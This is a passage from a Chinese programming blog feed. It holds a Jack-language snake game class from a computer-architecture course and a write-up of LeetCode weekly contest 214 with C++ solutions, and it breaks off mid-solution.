class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GluttonousSnake */</span></span><br><span class="line"><span class="comment">/* created by mike meng @ 2020.10.3</span></span><br><span class="line"><span class="comment">*  email: mml1106@126.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SnakeGame</span> </span>&#123;</span><br><span class="line">   field Snake snake; <span class="comment">// the square of this game</span></span><br><span class="line">   field <span class="keyword">int</span> width; <span class="comment">// the current score of the snake game.</span></span><br><span class="line">   field <span class="keyword">int</span> height; <span class="comment">// the current score of the snake game.</span></span><br><span class="line">   field <span class="keyword">int</span> speed; <span class="comment">// the current move speed of the snake game.</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Constructs a new Square Game. */</span></span><br><span class="line">   <span class="function">constructor SnakeGame <span class="title">new</span><span class="params">(<span class="keyword">int</span> w,<span class="keyword">int</span> h)</span> </span>&#123;</span><br><span class="line">      let snake = Snake.new(w,h);</span><br><span class="line">      let speed = <span class="number">1</span>;  <span class="comment">// initial state is no movement</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Disposes this game. */</span></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">dispose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">do</span> snake.dispose();</span><br><span class="line">      <span class="keyword">do</span> Memory.deAlloc(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**speed up game**/</span></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">speedUp</span><span class="params">()</span></span>&#123;</span><br><span class="line">      let speed = speed + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**speed down game**/</span></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">speedDown</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(speed = <span class="number">1</span>) &#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">      let speed = speed - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Moves the square in the current direction. */</span></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">moveSnake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">do</span> snake.move();</span><br><span class="line">      <span class="keyword">do</span> Sys.wait(<span class="number">5</span>);  <span class="comment">// delays the next movement</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">sleep</span><span class="params">(<span class="keyword">int</span> seconds)</span></span>&#123;</span><br><span class="line">      <span class="keyword">do</span> Sys.wait(<span class="number">200</span>/speed);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">drawBackgroud</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">do</span> Screen.setColor(<span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(<span class="number">0</span>,<span class="number">0</span>,<span class="number">511</span>,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(<span class="number">511</span>,<span class="number">0</span>,<span class="number">511</span>,<span class="number">255</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(<span class="number">0</span>,<span class="number">255</span>,<span class="number">511</span>,<span class="number">0255</span>);</span><br><span class="line">      <span class="keyword">do</span> Screen.drawLine(<span class="number">0</span>,<span class="number">30</span>,<span class="number">511</span>,<span class="number">30</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">drawText</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">do</span> Screen.setColor(<span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">do</span> Output.moveCursor(<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">      <span class="keyword">do</span> Output.printString(<span class="string">"Your score is :"</span>);</span><br><span class="line">      <span class="keyword">do</span> Output.printInt(snake.getScore());</span><br><span class="line">      <span class="keyword">if</span>(snake.isOver())&#123;</span><br><span class="line">         <span class="keyword">do</span> Output.moveCursor(<span class="number">1</span>,<span class="number">24</span>);</span><br><span class="line">         <span class="keyword">do</span> Output.printString(<span class="string">"Game Over!"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/** Runs the game: handles the user's inputs and moves the square accordingly */</span></span><br><span class="line">   <span class="function">method <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">char</span> key;  <span class="comment">// the key currently pressed by the user</span></span><br><span class="line">      <span class="keyword">var</span> <span class="keyword">boolean</span> exit;</span><br><span class="line">      let exit = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (~exit) &#123;</span><br><span class="line">         <span class="comment">// waits for a key to be pressed</span></span><br><span class="line">         <span class="function"><span class="keyword">do</span> <span class="title">sleep</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line">         <span class="function"><span class="keyword">do</span> <span class="title">drawBackgroud</span><span class="params">()</span></span>;</span><br><span class="line">         <span class="function"><span class="keyword">do</span> <span class="title">moveSnake</span><span class="params">()</span></span>;</span><br><span class="line">         <span class="function"><span class="keyword">do</span> <span class="title">drawText</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">         let key = Keyboard.keyPressed();</span><br><span class="line">         <span class="keyword">if</span> (key = <span class="number">81</span>)  &#123; let exit = <span class="keyword">true</span>; &#125;     <span class="comment">// q key</span></span><br><span class="line">         <span class="keyword">if</span> (key = <span class="number">43</span>)  &#123; <span class="function"><span class="keyword">do</span> <span class="title">speedUp</span><span class="params">()</span></span>;&#125;         <span class="comment">// speed up</span></span><br><span class="line">         <span class="keyword">if</span> (key = <span class="number">45</span>)  &#123; <span class="function"><span class="keyword">do</span> <span class="title">speedDown</span><span class="params">()</span></span>;&#125;       <span class="comment">// speed down</span></span><br><span class="line">         <span class="keyword">if</span> (key = <span class="number">131</span>) &#123; <span class="keyword">do</span> snake.moveUp();&#125;    <span class="comment">// up arrow</span></span><br><span class="line">         <span class="keyword">if</span> (key = <span class="number">133</span>) &#123; <span class="keyword">do</span> snake.moveDown(); &#125;   <span class="comment">// down arrow</span></span><br><span class="line">         <span class="keyword">if</span> (key = <span class="number">130</span>) &#123; <span class="keyword">do</span> snake.moveLeft(); &#125;   <span class="comment">// left arrow</span></span><br><span class="line">         <span class="keyword">if</span> (key = <span class="number">132</span>) &#123; <span class="keyword">do</span> snake.moveRight(); &#125;   <span class="comment">// right arrow</span></span><br><span class="line">     &#125; <span class="comment">// while</span></span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;week9&quot;&gt;&lt;a href=&quot;#week9&quot; class=&quot;headerlink&quot; title=&quot;week9&quot;&gt;&lt;/a&gt;week9&lt;/h1&gt;&lt;p&gt;目前已经开始了&lt;code&gt;build a computer&lt;/code&gt;系列的最后几章了，后面的章节感觉越来越难，&lt;code&gt;build a computer&lt;/code&gt;的&lt;code&gt;part II&lt;/code&gt;部分基本上全是软件，需要编码，耗费大量的实践和精力来应付这些代码，不过能够最终通过测试的话还是成就满满，特别是只剩下后面三章了，主要是完成一个&lt;code&gt;jack&lt;/code&gt;语言编译器和一个最基本的微型操作系统，并提供基本的系统库函数。感觉难度和挑战还是挺高的，非常喜欢这类基础的课程，要是这些课程放在大学本科该多好，有这么好的教程和资源，却一直从来没有机会接触到这么好的教育资源。其实从内心来说，叶不想让自己的孩子再重复一遍国内这种糟糕的教育，希望孩子能够正常成长吧，等他长大以后，作为老父亲的我能够把自己亲身体会到一些先进的理念和知识体系传授给他。&lt;/p&gt;
    
    </summary>
    
    
      <category term="build a computer" scheme="http://yoursite.com/categories/build-a-computer/"/>
    
    
      <category term="coursera" scheme="http://yoursite.com/tags/coursera/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】 周赛214场</title>
    <link href="http://yoursite.com/2020/11/08/222/"/>
    <id>http://yoursite.com/2020/11/08/222/</id>
    <published>2020-11-08T11:23:36.582Z</published>
    <updated>2020-11-09T01:46:12.966Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-contest-214"><a href="#leetcode-contest-214" class="headerlink" title="leetcode contest 214"></a>leetcode contest 214</h1><p>本周周赛的题目比较简单，最后一题竟然是典型的线段树的模板题目，没啥意思，直接<code>copy</code>模板搞定。第三题还稍微有那么点意思，本周最难的题目是第三题。上午做饭，忙家务，只能参加虚拟竞赛了。<br><img src="https://i.loli.net/2020/11/08/VKdlHCTfcqI2ygE.png" alt="1"></p><h2 id="5561-获取生成数组中的最大值"><a href="#5561-获取生成数组中的最大值" class="headerlink" title="5561. 获取生成数组中的最大值"></a>5561. 获取生成数组中的最大值</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数 n 。按下述规则生成一个长度为 <code>n + 1</code> 的数组 <code>nums</code> ：</p><a id="more"></a><ul><li><code>nums[0] = 0</code></li><li><code>nums[1] = 1</code></li><li>当 <code>2 &lt;= 2 * i &lt;= n</code>时，<code>nums[2 * i] = nums[i]</code></li><li>当 <code>2 &lt;= 2 * i + 1 &lt;= n</code>时，<code>nums[2 * i + 1] = nums[i] + nums[i + 1]</code><br>返回生成数组 <code>nums</code> 中的 最大 值。</li></ul><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">7</span></span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：根据规则：</span><br><span class="line">  nums[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">  nums[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">  nums[(<span class="number">1</span> * <span class="number">2</span>) = <span class="number">2</span>] = nums[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">  nums[(<span class="number">1</span> * <span class="number">2</span>) + <span class="number">1</span> = <span class="number">3</span>] = nums[<span class="number">1</span>] + nums[<span class="number">2</span>] = <span class="number">1</span> + <span class="number">1</span> = <span class="number">2</span></span><br><span class="line">  nums[(<span class="number">2</span> * <span class="number">2</span>) = <span class="number">4</span>] = nums[<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">  nums[(<span class="number">2</span> * <span class="number">2</span>) + <span class="number">1</span> = <span class="number">5</span>] = nums[<span class="number">2</span>] + nums[<span class="number">3</span>] = <span class="number">1</span> + <span class="number">2</span> = <span class="number">3</span></span><br><span class="line">  nums[(<span class="number">3</span> * <span class="number">2</span>) = <span class="number">6</span>] = nums[<span class="number">3</span>] = <span class="number">2</span></span><br><span class="line">  nums[(<span class="number">3</span> * <span class="number">2</span>) + <span class="number">1</span> = <span class="number">7</span>] = nums[<span class="number">3</span>] + nums[<span class="number">4</span>] = <span class="number">2</span> + <span class="number">1</span> = <span class="number">3</span></span><br><span class="line">因此，nums = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>]，最大值 <span class="number">3</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">2</span></span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：根据规则，nums[<span class="number">0</span>]、nums[<span class="number">1</span>] 和 nums[<span class="number">2</span>] 之中的最大值是 <span class="number">1</span></span><br><span class="line">示例 <span class="number">3</span>：</span><br><span class="line"></span><br><span class="line">输入：n = <span class="number">3</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：根据规则，nums[<span class="number">0</span>]、nums[<span class="number">1</span>]、nums[<span class="number">2</span>] 和 nums[<span class="number">3</span>] 之中的最大值是 <span class="number">2</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>0 &lt;= n &lt;= 100</code><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><a href="https://leetcode-cn.com/contest/weekly-contest-214/problems/get-maximum-in-generated-array/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/weekly-contest-214/problems/get-maximum-in-generated-array/</a><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  暴力吧</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3></blockquote></li></ul><ol><li>数据量太小，感觉没啥好说的，直接生成数组即可。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getMaximumGenerated</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr(n+<span class="number">1</span>);</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                arr[i] = arr[i/<span class="number">2</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                arr[i] = arr[i/<span class="number">2</span>+<span class="number">1</span>] + arr[i/<span class="number">2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            ans = max(ans,arr[i]);</span><br><span class="line">            <span class="comment">//cout&lt;&lt;arr[i]&lt;&lt;endl;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h2 id="5562-字符频次唯一的最小删除次数"><a href="#5562-字符频次唯一的最小删除次数" class="headerlink" title="5562. 字符频次唯一的最小删除次数"></a>5562. 字符频次唯一的最小删除次数</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>如果字符串 <code>s</code>中 不存在 两个不同字符 频次 相同的情况，就称 <code>s</code>是 优质字符串 。</p><p>给你一个字符串 <code>s</code>，返回使 <code>s</code>成为 优质字符串 需要删除的 最小 字符数。</p><p>字符串中字符的 频次 是该字符在字符串中的出现次数。例如，在字符串 <code>&quot;aab&quot;</code>中，’a’ 的频次是 2，而 <code>&#39;b&#39;</code>的频次是 1 。</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = <span class="string">"aab"</span></span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：s 已经是优质字符串。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：s = <span class="string">"aaabbbcc"</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：可以删除两个 'b' , 得到优质字符串 <span class="string">"aaabcc"</span> 。</span><br><span class="line">另一种方式是删除一个 'b' 和一个 'c' ，得到优质字符串 <span class="string">"aaabbc"</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：s = <span class="string">"ceabaacb"</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：可以删除两个 'c' 得到优质字符串 <span class="string">"eabaab"</span> 。</span><br><span class="line">注意，只需要关注结果字符串中仍然存在的字符。（即，频次为 <span class="number">0</span> 的字符会忽略不计。）</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= s.length &lt;= 105</code></li><li><code>s</code> 仅含小写英文字母</li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-deletions-to-make-character-frequencies-unique" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-deletions-to-make-character-frequencies-unique</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 排序</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>贪心算法，我们按照字符的频次从大到小排列即可，然后利用贪心法，如果当前字符的频次比前一个字符小，每次递减刚好比前一个频次小<code>1</code>即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minDeletions</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; freq;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : s)&#123;</span><br><span class="line">            freq[c]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : freq)&#123;</span><br><span class="line">            arr.push_back(v.second);</span><br><span class="line">        &#125;</span><br><span class="line">        sort(arr.begin(),arr.end());</span><br><span class="line">        <span class="keyword">int</span> n = arr.size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n<span class="number">-2</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i] &gt;= arr[i+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">int</span> curr = max(arr[i+<span class="number">1</span>]<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">                ans += arr[i] - curr;</span><br><span class="line">                arr[i] = curr;</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5563-销售价值减少的颜色球"><a href="#5563-销售价值减少的颜色球" class="headerlink" title="5563. 销售价值减少的颜色球"></a>5563. 销售价值减少的颜色球</h2><p>你有一些球的库存 inventory ，里面包含着不同颜色的球。一个顾客想要 任意颜色 总数为 <code>orders</code>的球。</p><p>这位顾客有一种特殊的方式衡量球的价值：每个球的价值是目前剩下的 同色球 的数目。比方说还剩下 6 个黄球，那么顾客买第一个黄球的时候该黄球的价值为 6 。这笔交易以后，只剩下 5 个黄球了，所以下一个黄球的价值为 5 （也就是球的价值随着顾客购买同色球是递减的）</p><p>给你整数数组 <code>inventory</code> ，其中 <code>inventory[i]</code>表示第 i 种颜色球一开始的数目。同时给你整数 <code>orders</code> ，表示顾客总共想买的球数目。你可以按照 任意顺序 卖球。</p><p>请你返回卖了 <code>orders</code>个球以后 最大 总价值之和。由于答案可能会很大，请你返回答案对 <code>109 + 7</code>取余数 的结果。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：inventory = [<span class="number">2</span>,<span class="number">5</span>], orders = <span class="number">4</span></span><br><span class="line">输出：<span class="number">14</span></span><br><span class="line">解释：卖 <span class="number">1</span> 个第一种颜色的球（价值为 <span class="number">2</span> )，卖 <span class="number">3</span> 个第二种颜色的球（价值为 <span class="number">5</span> + <span class="number">4</span> + <span class="number">3</span>）。</span><br><span class="line">最大总和为 <span class="number">2</span> + <span class="number">5</span> + <span class="number">4</span> + <span class="number">3</span> = <span class="number">14</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：inventory = [<span class="number">3</span>,<span class="number">5</span>], orders = <span class="number">6</span></span><br><span class="line">输出：<span class="number">19</span></span><br><span class="line">解释：卖 <span class="number">2</span> 个第一种颜色的球（价值为 <span class="number">3</span> + <span class="number">2</span>），卖 <span class="number">4</span> 个第二种颜色的球（价值为 <span class="number">5</span> + <span class="number">4</span> + <span class="number">3</span> + <span class="number">2</span>）。</span><br><span class="line">最大总和为 <span class="number">3</span> + <span class="number">2</span> + <span class="number">5</span> + <span class="number">4</span> + <span class="number">3</span> + <span class="number">2</span> = <span class="number">19</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：inventory = [<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">6</span>], orders = <span class="number">20</span></span><br><span class="line">输出：<span class="number">110</span></span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：inventory = [<span class="number">1000000000</span>], orders = <span class="number">1000000000</span></span><br><span class="line">输出：<span class="number">21</span></span><br><span class="line">解释：卖 <span class="number">1000000000</span> 次第一种颜色的球，总价值为 <span class="number">500000000500000000</span> 。 <span class="number">500000000500000000</span> 对 <span class="number">109</span> + <span class="number">7</span> 取余为 <span class="number">21</span> 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= inventory.length &lt;= 105</code></li><li><code>1 &lt;= inventory[i] &lt;= 109</code></li><li><code>1 &lt;= orders &lt;= min(sum(inventory[i]), 109)</code></li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/sell-diminishing-valued-colored-balls" target="_blank" rel="noopener">https://leetcode-cn.com/problems/sell-diminishing-valued-colored-balls</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 排序贪心法直接模拟，二分查找</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>排序直接模拟的思路就非常简单，我们首先将所有的球按照数量从大到小进行排列，我们直接记录下当前数目的频次，每次取球时，首先取得数量最大的球，为了保证数量唯一性，每次取与下一个数之间差值的数量个球，这样可以保证结果最大，本质为贪心法。不过细节上还是容易出错，因为存在等差数列求合的问题需要仔细处理。</li><li>二分查找：我们通过二分直接查找到最终剩余的球的最大值$target$即可，及我们知道可能存在部分球，这部分稍微难以理解点，用了一个图来稍微表示下。我们找到的target刚好能够满足以下以下不等式的最小值。<script type="math/tex; mode=display">\sum_{i=1}^{n}(max(A[i]-target,0)) \le orders \le \sum_{i=1}^{n}(max(A[i]-target+1,0))</script>在满足上述不等式的条件下，我们可以通过二分查找的方法来找到最小的<code>target</code>，这种思路本质也是贪心算法。<br><img src="https://i.loli.net/2020/11/08/8j32WxKpybMSJOm.jpg" alt="1"><br>然后我们依次计算所有颜色的球的取的代价，如果该颜色<code>i</code>的球的数量满足条件$A[i] &gt; target$则我们总共需要取出$A[i] - target$个球即可，同时从<code>order</code>中剔除本次取出该颜色的球的数目，如果剩余的<code>order</code>仍然大于<code>0</code>时，则此时按照题目要求，应该从数目为<code>target</code>的颜色的球中取出<code>orders</code>个球即可满足最大价值，此时的价值总数为:<script type="math/tex; mode=display">设 T_{i} = max(A[i]-target,0) \\\sum_{i=1}^{n}((A[i]*2 - T_{i} + 1)*T_{i}/2) + (orders - \sum_{i=1}^{n}(T_{i}))*target</script>如果能够理解上述公式就能够理解题目的意思了。</li><li>第三题应该时本周赛中稍微有亮点和难度的题目，非常喜欢这类题目，有思考的深度。但又并不是固定模板的题目。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3></li></ol><ul><li>贪心算法<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A, <span class="keyword">int</span> orders)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = A.size();</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span 